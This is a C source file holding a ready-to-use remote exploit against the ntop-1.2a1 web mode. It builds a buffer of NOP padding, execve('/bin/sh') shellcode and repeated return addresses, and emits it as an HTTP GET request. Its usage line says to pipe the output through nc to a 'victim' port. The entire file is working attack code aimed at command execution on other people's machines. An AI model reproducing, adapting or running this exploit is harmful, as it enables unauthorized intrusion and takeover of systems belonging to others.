#include <stdio.h>
#include <string.h>


char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

void usage()
{
 printf("NTOP ntop-1.2a1 -w mode command execution exploit.\n");
 printf("                                 mat@hacksware.com\n");
 printf("Usage : ./ntop-w-exp | nc victim port\n");
 exit(0);
}

void main( int argc, char *argv[] )
{
  int i,offset=-24;
#define CODE_LEN 240
#define NOP_LEN 50
  char code_buf[CODE_LEN];
  unsigned long esp=0xbedffb00;

  if(argc >= 2) offset = atoi(argv[1]);

  memset(code_buf,0x90,NOP_LEN); //insert NOP CODES
  memcpy(code_buf+NOP_LEN, shellcode, strlen(shellcode));
  for(i=strlen(shellcode)+NOP_LEN;i<=CODE_LEN;i+=4)
     *(long *)&code_buf[i]=(unsigned long)esp-offset;

  printf("GET /");
  for(i=0;i<CODE_LEN; i++)
  {
     putchar(code_buf[i]);
  }
  printf("\r\n\r\n");
}

